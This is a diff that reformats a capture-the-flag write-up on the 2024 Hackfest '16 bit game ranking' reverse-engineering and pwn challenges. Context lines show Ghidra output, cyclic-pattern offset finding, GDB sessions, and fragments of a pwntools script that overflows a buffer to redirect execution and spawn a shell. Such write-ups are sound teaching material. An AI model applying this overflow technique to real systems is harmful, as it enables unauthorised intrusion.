@@ -4,9 +4,10 @@
 ]=-------------------=[  HFCTF Pwn 16 bit game ranking  ]=--------------------=[
 ]=----------------------------------------------------------------------------=[
 
-
   > FYI, this writeup was made before revamping my site with this text based 
     ascii look. There are more pictures than i'd like.
+  
+This challenge was part of the 2024 Hackfest CTF (HFCTF).
 
 In this writeup I will be going over the 3 `16 bit game ranking` challenges made
 by salt. They are `rev` and `pwn` challenges. They are fairly easy but since in
@@ -14,16 +15,13 @@ by salt. They are `rev` and `pwn` challenges. They are fairly easy but since in
 solve them this year.
 
 The first part is a `rev` challenge worth 50 points
-
 The second part is a `pwn` challenge worth 100 points
-
 The last parth is a `pwn` challenge worth 300 points
 
 
 
 
-        -------------------------=[  Part 1  ]=-------------------------        
-
+--|  First flag
 
 We are given a `chal1` executable file.
 
@@ -55,7 +53,7 @@ function when passed the `0xdead` (`57005` in decimal) value.
 `admin` function decompiled:
 
 
-+----------------------------~<] C Disassembly [>~-----------------------------+
++-------------------------~<]  Ghidra Disassembly  [>~-------------------------+
 void admin(void)
 {
   int iVar1;
@@ -139,7 +137,7 @@ Alright, now all we have to do is find the password.
 Looking at the `admin` decompiled code, this part is interesting:
 
 
-+----------------------------~<] C Disassembly [>~-----------------------------+
++-------------------------~<]  Ghidra Disassembly  [>~-------------------------+
   local_4c = 0;
   local_44 = 0;
   local_68 = 0;
@@ -172,7 +170,7 @@ Since `chal1` is little endian (LSB, see the file command screenshot), we need
 to swap endianness.
 
 
-+----------------------------~<] C Disassembly [>~-----------------------------+
++-------------------------~<]  Ghidra Disassembly  [>~-------------------------+
   local_78 = 0x4551207ed67005b4;
   local_70 = 0x4621e6068943f87f;
 +------------------------------------------------------------------------------+
@@ -192,13 +190,12 @@ the first flag.
 
 
 
-        -------------------------=[  Part 2  ]=-------------------------        
+--|  Second Flag
         
-
 After obtaining the first flag, this code is executed in the `admin` function:
 
 
-+----------------------------~<] C Disassembly [>~-----------------------------+
++-------------------------~<]  Ghidra Disassembly  [>~-------------------------+
 local_10 = fopen("flag1.txt","r");
 if (local_10 == (FILE *)0x0) {
     puts("ERROR! The flag cannot be read! Contact the designer!");
@@ -231,12 +228,12 @@ at which we overwrite the `rip` register.
 Let's first print a cyclic string to calculate the offset
 
 
-+-----------------------------~<] Python REPL [>~------------------------------+
-python
-import pwn
-pwn.cyclic(150)
-# aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaata
-  aauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
++----------------------------~<]  Python REPL  [>~-----------------------------+
+$ python
+>>> import pwn
+>>> pwn.cyclic(150)
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa
+uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
 +------------------------------------------------------------------------------+
 
 
@@ -247,7 +244,7 @@ Enter the `admin` function with `57005` and the `bubbles1` password, then print
 the cyclic string. The program should get a segmentation fault
 
 
-+-----------------------------~<] GDB session [>~------------------------------+
++----------------------------~<]  GDB session  [>~-----------------------------+
 gdb ./chal1
 run
 57005
@@ -287,7 +284,7 @@ Now let's open GDB and `disass vote`, and set a breakpoint to the function
 instruction offset. 
 
 
-+-----------------------------~<] GDB session [>~------------------------------+
++----------------------------~<]  GDB session  [>~-----------------------------+
 gdb ./chal1
 disass vote
 +------------------------------------------------------------------------------+
@@ -302,7 +299,7 @@ first time with `PIE`.
 We add a breakpoint to it and run the program:
 
 
-+-----------------------------~<] GDB session [>~------------------------------+
++----------------------------~<]  GDB session  [>~-----------------------------+
 break *vote+381
 run
 +------------------------------------------------------------------------------+
@@ -364,7 +361,7 @@ hidden menu, enter the password, then enter the calculated address of the `flag`
 function at the correct offset to redirect execution to print the flag.
 
 
-+--------------------------------~<] Python [>~--------------------------------+
++-------------------------------~<]  Python  [>~-------------------------------+
 from pwn import *
 
 context(os='linux', arch='amd64')
@@ -415,8 +412,7 @@ was the actual challenge)
 
 
 
-        -------------------------=[  Part 3  ]=-------------------------        
-
+--|  Third Flag
 
 For the last part it is suggested that we try running a `/bin/sh` shell after 
 obtaining the second flag so let's do that.
@@ -468,7 +464,7 @@ Here's the updated pwntools script, only the last section for the payload is
 changed
 
 
-+--------------------------------~<] Python [>~--------------------------------+
++-------------------------------~<]  Python  [>~-------------------------------+
 # ...
 base_addr = int(addr, 16) - 0x001020c7
 flag_function_addr = base_addr + 0x00101f18
